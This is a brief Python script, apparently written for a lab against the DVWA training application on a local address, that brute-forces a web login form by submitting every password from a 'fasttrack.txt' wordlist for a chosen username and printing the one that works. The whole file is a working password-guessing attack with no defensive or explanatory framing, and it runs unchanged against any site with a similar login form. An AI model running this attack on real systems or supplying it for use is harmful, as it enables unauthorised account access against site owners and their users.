import mechanicalsoup
import sys

def ataque(browser, lines):
	count = 0
	for p in lines:
		count += 1
		browser.select_form('form[action ="login.php"]')
		browser["username"] = user
		browser["password"] = p.strip()
		browser.submit_selected()
		resposta = browser.get_url()
		if (resposta != "http://192.168.15.97/dvwa/login.php"):
			print(resposta)
			print(f"Senha {str(count)} correta: {p}")
			break
		else:
			print(f"Senha {str(count)} incorreta: {p}")

if __name__ == "__main__":
	browser = mechanicalsoup.StatefulBrowser()

	if len(sys.argv) < 3:
		print("Modo de uso: python3 ataque.py + pagina + username")
		sys.exit()

	site = sys.argv[1]
	user = sys.argv[2]

	browser.open(site)

	password = open("fasttrack.txt", "r")
	lines = password.readlines()

	ataque(browser, lines)
